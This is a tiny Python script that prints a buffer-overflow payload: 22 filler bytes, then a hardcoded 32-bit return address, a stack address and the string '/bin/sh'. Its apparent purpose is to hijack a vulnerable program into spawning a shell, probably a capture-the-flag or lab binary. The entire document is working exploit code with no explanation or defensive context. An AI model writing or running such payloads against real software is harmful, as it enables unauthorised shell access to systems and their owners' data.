import sys
sys.stdout.buffer.write(b'A'*22 + 0x08048c12.to_bytes(4,'little') + 0xfff6f8e4.to_bytes(4,'little')+b"/bin/sh")